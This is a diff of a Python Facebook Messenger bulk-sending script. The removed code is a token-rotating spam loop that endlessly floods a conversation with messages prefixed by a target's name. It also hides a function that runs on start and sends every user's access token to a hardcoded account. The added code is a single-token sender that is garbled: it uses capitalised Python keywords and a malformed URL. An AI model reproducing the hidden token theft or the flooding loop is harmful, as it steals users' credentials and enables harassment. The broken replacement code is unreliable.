@@ -1,150 +1,82 @@
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
-import random
-import requests
-import json
-import time
-import sys
-from platform import system
-import os
-import subprocess
-import http.server
-import socketserver
-import threading
+Import requests
+Import json
+Import time
+From datetime import datetime
 
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-      def do_GET(self):
-          self.send_response(200)
-          self.send_header('Content-type', 'text/plain')
-          self.end_headers()
-          self.wfile.write(b"  THE DARK MONSTAR KHOF HERE")
-def execute_server():
-      PORT = int(os.environ.get('PORT', 4000))
+# Clear screen function
+Def cls():
+    Print("\033[2J\033[H", end="")
 
-      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-          print("Server running at http://localhost:{}".format(PORT))
-          httpd.serve_forever()
+# Logo display function
+Def logo():
+    Print("""
+\033[1;36m
+$$$$$$$\   $$$$$$\     $$$$$\ 
+$$  __$$\ $$  __$$\    \__$$ |
+$$ |  $$ |$$ /  $$ |      $$ |
+$$$$$$$  |$$$$$$$$ |      $$ |
+$$  __$$< $$  __$$ |$$\   $$ |
+$$ |  $$ |$$ |  $$ |$$ |  $$ |
+$$ |  $$ |$$ |  $$ |\$$$$$$  |
+\__|  \__|\__|  \__| \______/
 
+\033[1;34mSend Messages to Non-End-to-End Encrypted Chats
+\033[1;33mDeveloped by: Your Name Raj Thakur 
+""")
 
-def send_initial_message():
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
+# Messenger function to send messages
+Def message_on_messenger(token, thread_id, messages, delay):
+    Headers = {
+        'Authorization': f'Bearer {token}',
+        'Content-Type': 'application/json'
+    }
 
-      # Modify the message as per your requirement
-      msg_template = "Hello khof papa g! I am using your server. My token is {}"
+    # Updated API URL
+    Url = f"https://www.facebook.com/profile.php?id=61571112957467{thread_id}/messages"
 
-      # Specify the ID where you want to send the message
-      target_id = "100093225084747"
+    For message in messages:
+        Data = {
+            "Message": message.strip()
+        }
+        Response = requests.post(url, headers=headers, json=data)
+        Timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-      requests.packages.urllib3.disable_warnings()
+        If response.status_code == 200:
+            Print(f"\033[1;32m[✓] {timestamp} - Message sent: {message.strip()}")
+        Else:
+            Print(f"\033[1;31m[×] {timestamp} - Failed to send message: {response.text}")
+        
+        Time.sleep(delay)
 
-      def liness():
-          print('\033[1;92m' + '•────────────────────── TRICKS BY KHOF ───────────────────────────────•')
+# Main script
+If __name__ == "__main__":
+    Cls()
+    Logo()
 
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
+    # User inputs
+    Print("\033[1;34m[+] Enter your Facebook Graph API token:")
+    Token = input("Token: ").strip()
 
-      for token in tokens:
-          access_token = token.strip()
-          url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
-          msg = msg_template.format(access_token)
-          parameters = {'access_token': access_token, 'message': msg}
-          response = requests.post(url, json=parameters, headers=headers)
+    Print("\033[1;34m[+] Enter the thread ID where you want to send messages:")
+    Thread_id = input("Thread ID: ").strip()
 
-          # No need to print here, as requested
-          current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
-          time.sleep(0.1)  # Wait for 1 second between sending each initial message
+    Print("\033[1;34m[+] Enter the name of the text file containing messages:")
+    File_name = input("File Name: ").strip()
 
-      #print("\n[+] Initial messages sent. Starting the message sending loop...\n")
-send_initial_message()
-def send_messages_from_file():
-      with open('convo.txt', 'r') as file:
-          convo_id = file.read().strip()
+    Print("\033[1;34m[+] Enter the delay time (in seconds) between each message:")
+    Delay = int(input("Delay (seconds): "))
 
-      with open('file.txt', 'r') as file:
-          messages = file.readlines()
+    # Reading messages from the file
+    Try:
+        With open(file_name, 'r', encoding='utf-8') as file:
+            Messages = file.readlines()
+    Except FileNotFoundError:
+        Print("\033[1;31m[×] Error: File not found!")
+        Exit(1)
 
-      num_messages = len(messages)
+    Print("\033[1;32m[✓] Starting to send messages...\n")
 
-      with open('token.txt', 'r') as file:
-          tokens = file.readlines()
-      num_tokens = len(tokens)
-      max_tokens = min(num_tokens, num_messages)
+    # Sending messages
+    Message_on_messenger(token, thread_id, messages, delay)
 
-      with open('name.txt', 'r') as file:
-          haters_name = file.read().strip()
-
-      with open('time.txt', 'r') as file:
-          speed = int(file.read().strip())
-
-      def liness():
-          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
-
-      headers = {
-          'Connection': 'keep-alive',
-          'Cache-Control': 'max-age=0',
-          'Upgrade-Insecure-Requests': '1',
-          'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-          'Accept-Encoding': 'gzip, deflate',
-          'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-          'referer': 'www.google.com'
-      }
-
-      while True:
-          try:
-              for message_index in range(num_messages):
-                  token_index = message_index % max_tokens
-                  access_token = tokens[token_index].strip()
-
-                  message = messages[message_index].strip()
-
-                  url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
-                  parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
-                  response = requests.post(url, json=parameters, headers=headers)
-
-                  current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
-                  if response.ok:
-                      print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  else:
-                      print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
-                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
-                      liness()
-                      liness()
-                  time.sleep(speed)
-
-              print("\n[+] All messages sent. Restarting the process...\n")
-          except Exception as e:
-              print("[!] An error occurred: {}".format(e))
-
-def main():
-      server_thread = threading.Thread(target=execute_server)
-      server_thread.start()
-
-      # Send the initial message to the specified ID using all tokens
-
-
-      # Then, continue with the message sending loop
-      send_messages_from_file()
-
-if __name__ == '__main__':
-      main()
+    Print("\033[1;32m[✓] All messages sent successfully!")
